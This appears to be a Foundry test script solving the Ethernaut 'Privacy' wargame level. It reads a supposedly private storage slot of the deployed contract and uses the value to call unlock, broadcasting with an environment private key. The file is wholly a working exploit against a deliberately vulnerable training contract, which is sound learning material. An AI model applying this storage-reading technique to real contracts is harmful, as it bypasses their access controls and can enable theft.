pragma solidity ^0.8.0;
import "../instances/Ilevel12.sol";
import "forge-std/Test.sol";

contract Level12 is Test {
    Privacy level12 = Privacy(0x4aF6B3574a45F45095Df3754f230680B8748282d);

    function test() external {
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(attackerPrivateKey);
        bytes16 key = bytes16(vm.load(address(level12), bytes32(uint256(5))));
        level12.unlock(key);
        require(level12.locked() == false, "Level12: not unlocked");
        vm.stopBroadcast();
    }
}
